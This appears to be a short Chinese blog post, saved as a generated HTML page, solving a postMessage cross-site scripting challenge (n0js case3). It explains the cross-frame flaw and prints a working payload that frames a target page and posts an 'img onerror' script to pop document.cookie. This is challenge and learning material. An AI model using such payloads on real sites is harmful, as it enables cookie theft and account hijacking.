@@ -1,0 +1,307 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>n0js case3 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002
+http://server.n0tr00t.com/n0js/case3.php
+https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html
+
+在不同网页之间使用postMessage交流信息的时候，存在xss的情况，上面第二个链接是问题，第一个和第三个是对应的解决方法，最后的payload就是如下：
+简单来说，如果A存在xss，B使用postMessage接收来自A的信息，那么在A站可以加载B的iframe，弹出B的cookie。所以这种情况下，A，B都是存在Xss漏洞的。
+var t &amp;#x3D; document.createElement(&amp;quot;iframe&amp;quot;);
+t.setAttribute(&amp;quot;src&amp;quot;,&amp;quot;https:&amp;#x2F;&amp;#x2F;www.n0tr00t.com&amp;#x2F;static&amp;#x2F;test&amp;#x2F;helloevent.html&amp;quot;);
+&amp;#x2F;&amp;#x2F;t.setAttribute(&amp;quot;onload&amp;quot;,&amp;quot;frames[0].postMessage(&amp;#39;&amp;lt;input onfocus&amp;#x3D;alert(document.cookie) autofocus&amp;gt;&amp;#39;,&amp;#39;*&amp;#39;)&amp;quot;);
+document.body.appendChild(t);
+
+function a()&amp;#123;
+var b &amp;#x3D; document.createElement(&amp;quot;button&amp;quot;);
+b.setAttribute(&amp;quot;onclick&amp;quot;,&amp;quot;frames[0].postMessage(&amp;#39;&amp;lt;img src&amp;#x3D;x onerror&amp;#x3D;alert(document.cookie)&amp;gt;&amp;#39;,&amp;#39;*&amp;#39;)&amp;quot;);
+&amp;#x2F;&amp;#x2F;b.setAttribute(&amp;quot;onclick&amp;quot;,&amp;quot;frames[0].postMessage(&amp;#39;this is onerror img src&amp;#39;,&amp;#39;*&amp;#39;)&amp;quot;);
+document.body.appendChild(b);
+b.click();
+&amp;#125;
+&amp;#x2F;&amp;#x2F;setTimeout(&amp;quot;a()&amp;quot;,3000);
+window.onload &amp;#x3D; a();"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="n0js case3"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> n0js case3</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <ul>
+<li><a target="_blank" rel="noopener" href="https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002">https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002</a></li>
+<li><a target="_blank" rel="noopener" href="http://server.n0tr00t.com/n0js/case3.php">http://server.n0tr00t.com/n0js/case3.php</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html">https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html</a></li>
+</ul>
+<p>在不同网页之间使用postMessage交流信息的时候，存在xss的情况，上面第二个链接是问题，第一个和第三个是对应的解决方法，最后的payload就是如下：</p>
+<p>简单来说，如果A存在xss，B使用postMessage接收来自A的信息，那么在A站可以加载B的iframe，弹出B的cookie。所以这种情况下，A，B都是存在Xss漏洞的。</p>
+<pre class="line-numbers language-none"><code class="language-none">var t &#x3D; document.createElement(&quot;iframe&quot;);
+t.setAttribute(&quot;src&quot;,&quot;https:&#x2F;&#x2F;www.n0tr00t.com&#x2F;static&#x2F;test&#x2F;helloevent.html&quot;);
+&#x2F;&#x2F;t.setAttribute(&quot;onload&quot;,&quot;frames[0].postMessage(&#39;&lt;input onfocus&#x3D;alert(document.cookie) autofocus&gt;&#39;,&#39;*&#39;)&quot;);
+document.body.appendChild(t);
+
+function a()&#123;
+var b &#x3D; document.createElement(&quot;button&quot;);
+b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;&lt;img src&#x3D;x onerror&#x3D;alert(document.cookie)&gt;&#39;,&#39;*&#39;)&quot;);
+&#x2F;&#x2F;b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;this is onerror img src&#39;,&#39;*&#39;)&quot;);
+document.body.appendChild(b);
+b.click();
+&#125;
+&#x2F;&#x2F;setTimeout(&quot;a()&quot;,3000);
+window.onload &#x3D; a();
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2017/01/07/n0js-case-postMessage-xss.html" class="leancloud-visitors view" data-flag-title="n0js case3">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2017/02/02/mac-re.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2017/01/05/SQL隐形转换绕过waf.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-01-07 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Fun/">Fun<span>3</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
